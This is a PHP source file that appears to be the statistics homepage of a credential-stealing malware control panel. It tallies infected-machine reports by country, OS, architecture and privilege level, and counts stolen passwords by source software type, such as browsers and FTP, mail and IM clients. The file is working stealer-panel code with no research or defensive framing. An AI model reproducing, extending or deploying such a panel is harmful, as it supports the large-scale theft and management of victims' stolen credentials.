<?php
	include "functions.php";
	include "./../index.php";
	
$HTML = "";
$PAGE ="";





function SQLToArray($query){
	$result = array();
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	if (!$link) {
		echo "DB error." . PHP_EOL;
		echo "Code errno: " . mysqli_connect_errno() . PHP_EOL;
		echo "Text error: " . mysqli_connect_error() . PHP_EOL;
		die();
    exit;
}

	mysqli_set_charset($link, 'utf8' );
	$res = mysqli_query($link, $query);
	if (!$res) {
		echo "Query error." . PHP_EOL;
		echo "Code errno: " . mysqli_connect_errno() . PHP_EOL;
		echo "Text error: " . mysqli_connect_error() . PHP_EOL;
		mysqli_close($link);
		die();
    exit;
}

	while($row = mysqli_fetch_assoc($res)){  
		array_push($result, $row);		
	}
	mysqli_close($link);
	for($i=0; $i<count($result); $i++){
		foreach($result[$i] as $key2=>$value){
			$result[$i][$key2] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
			
		}
	}
	
	return $result;	
};




	



	
function ShowHomePage(){
	global $HTML;
	$page=FileToString('./html/home.html');
	$tables='';
	$div="<div style='display: inline-block; vertical-align: top; padding: 5px'>";
	
	
	$c_all = SQLToArray("SELECT COUNT(*) AS c FROM reports")[0]['c'];


	$c_today = SQLToArray("SELECT COUNT(*) AS c FROM reports 
WHERE YEAR(reports.date) = YEAR(NOW()) AND MONTH(reports.date) = MONTH(NOW()) AND WEEK(reports.date, 1) = WEEK(NOW(), 1) AND DAY(reports.date) = DAY(NOW())")[0]['c'];

	$c_week =  SQLToArray("SELECT COUNT(*) AS c FROM reports 
WHERE YEAR(reports.date) = YEAR(NOW()) AND MONTH(reports.date) = MONTH(NOW()) AND WEEK(reports.date, 1) = WEEK(NOW(), 1)")[0]['c'];


	$c_month = SQLToArray("SELECT COUNT(*) AS c FROM reports 
WHERE YEAR(reports.date) = YEAR(NOW()) AND MONTH(reports.date) = MONTH(NOW())")[0]['c'];

	$c_stat = array(
				array('All', $c_all),
				array('Today', $c_today),
				array('Week', $c_week),
				array('Month', $c_month),
				);

	$tables .=$div."Reports count".build_table($c_stat,  
								array('', ''), 
								"stat-table",
								array(' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tmp = 	SQLToArray("SELECT country, COUNT(*) AS CountRec, 
										COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
									  FROM reports
									  GROUP BY `country`
									  ORDER BY CountRec DESC");
	for($i=0; $i<count($tmp); $i++)	{
		$tmp[$i]['country'] = "<img src='img/flags/".strtolower($tmp[$i]['country']).".png'> ".$tmp[$i]['country'];
	}								
	$tables .=$div."Country stats".build_table($tmp,  
								array('Country', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
								
								
	$tables .=$div."Arch stats".build_table(SQLToArray(" SELECT `os_arch`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `os_arch`
										  ORDER BY CountRec DESC"),  
								array('Arch', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tmp = 	SQLToArray("SELECT `os_ver`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `os_ver`
										  ORDER BY CountRec DESC");
	for($i=0; $i<count($tmp); $i++)	{
		$tmp[$i]['os_ver'] = "<img src='img/win/".strtolower($tmp[$i]['os_ver']).".png'> ".$tmp[$i]['os_ver'];
	}							
								
	$tables .=$div."OS stats".build_table($tmp,  
								array('OS', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tables .=$div."Rights stats".build_table(SQLToArray(" SELECT `bin_rights`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `bin_rights`
										  ORDER BY CountRec DESC"),  
								array('Rights', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
	
		$tables .=$div."Binary type stats".build_table(SQLToArray("  SELECT `bin_type`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
  FROM reports
  GROUP BY `bin_type`
  ORDER BY CountRec DESC"),  
								array('Type', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
		$arr = SQLToArray("  SELECT `p_soft_type`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM passwords)*100 AS percent
				  FROM passwords
				  GROUP BY `p_soft_type`
				  ORDER BY CountRec DESC");
		for ($i=0; $i<sizeof($arr); $i++)
		{
			if($arr[$i]["p_soft_type"] ==  "1") $arr[$i]["p_soft_type"]="Browsers";
			if($arr[$i]["p_soft_type"] ==  "2") $arr[$i]["p_soft_type"]="FTP Clients";
			if($arr[$i]["p_soft_type"] ==  "3") $arr[$i]["p_soft_type"]="Mail Clients";
			if($arr[$i]["p_soft_type"] ==  "4") $arr[$i]["p_soft_type"]="IM Clients";
		};
		$tables .=$div."Passwords type stats".build_table($arr,  
								array('Type', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
		$tmp = 	SQLToArray(" SELECT p_soft_name, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM passwords)*100 AS percent
															  FROM passwords
															  GROUP BY `p_soft_name`
															  ORDER BY CountRec DESC");	
		for($i=0; $i<count($tmp); $i++)	{
			$tmp[$i]["p_soft_name"] = "<img src='img/softs/".$tmp[$i]['p_soft_name'].".png'> ".$tmp[$i]['p_soft_name'];
		}														
		$tables .=$div."Software stats".build_table($tmp,  
								array('Soft', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";							
			
	$HTML = $tables;
	
	$HTML = FileToString('./html/guest.html');
	$HTML = str_replace("%PADE_DATA%", $tables, $HTML);
};


	
	
ShowHomePage();
echo $HTML;

?>